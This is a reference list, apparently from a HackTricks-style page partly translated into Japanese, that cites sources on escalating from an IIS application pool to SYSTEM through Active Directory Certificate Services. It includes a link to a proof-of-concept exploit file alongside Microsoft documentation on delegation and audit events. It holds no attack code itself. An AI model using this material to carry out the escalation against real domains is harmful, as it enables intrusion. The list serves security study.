- [16] [Furious5 – AD CS ESC16: Misconfiguration と Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” の再検討](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint 経由での IIS AppPool からの Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Kerberos authentication ticket が request された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Kerberos service ticket が request された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
{{#include ../../../banners/hacktricks-training.md}}
